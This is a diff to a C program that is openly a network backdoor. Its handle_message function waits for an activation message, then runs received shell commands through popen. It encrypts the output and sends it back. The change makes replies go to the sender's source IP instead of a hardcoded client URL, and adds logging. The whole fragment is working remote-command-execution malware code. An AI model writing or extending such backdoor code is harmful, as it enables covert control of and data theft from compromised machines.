@@ -86,25 +86,20 @@ static void handle_message(struct message_details *message_details)
   int ciphertext_len;
   unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
   unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
-  unsigned char res_message[MESSAGE_BUF_SIZE];
+  unsigned char res_message[MESSAGE_BUF_SIZE], client_ip[IP_BUF_SIZE];
 
   // reset buffers
   memset(cmd_output, 0, sizeof(cmd_output));
 
   // skip if no data
   if (strlen((const char *)message_details->message) == 0)
-  {
-    // printf("empty message, skipping...\n");
     return;
-  }
 
   parse_message(message_details->message, &message);
 
   // do not handle message if the backdoor is not active
   if (active != true && message.type != TYPE_INVOKE_BACKDOOR)
-  {
     return;
-  }
 
   if (message.type == TYPE_EXECUTE_CMD)
   {
@@ -150,14 +145,17 @@ static void handle_message(struct message_details *message_details)
         break;
       }
 
-      // TODO: fix to use dynamic IP
-      send_request((unsigned char *)res_message, CLIENT_URL);
-      fprintf(stdout, "finished executing command '%s'\n", command);
+      saddr_to_str(client_ip, message_details->ip_saddr);
+
+      send_request(res_message, client_ip);
 
       bzero(cmd_output, sizeof(cmd_output));
       // break when the last segment is read
       if (feof(cmd) != 0)
+      {
+        log_info("transfer complete...");
         break;
+      }
     }
 
     pclose(cmd);
